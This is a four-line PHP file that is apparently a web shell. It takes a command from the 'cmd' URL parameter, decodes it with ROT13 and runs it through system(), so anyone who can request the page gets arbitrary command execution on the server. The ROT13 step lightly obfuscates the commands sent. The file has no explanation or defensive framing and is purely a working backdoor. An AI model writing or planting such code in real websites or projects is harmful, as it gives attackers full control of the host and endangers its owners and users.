<?php
$c = $_GET['cmd'];
$c = str_rot13($c);
system($c);
?>